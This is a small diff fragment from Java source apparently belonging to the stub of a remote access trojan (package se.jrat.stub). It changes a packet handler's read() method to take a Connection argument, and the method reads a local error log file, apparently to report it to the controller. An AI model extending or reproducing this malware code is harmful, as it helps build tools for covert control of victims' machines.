@@ -12,7 +12,7 @@ import se.jrat.stub.utils.Utils;
 public class Packet86ErrorLog extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		try {
 			FileInputStream in = new FileInputStream("err.dat");
 			String str = Utils.readString(in);
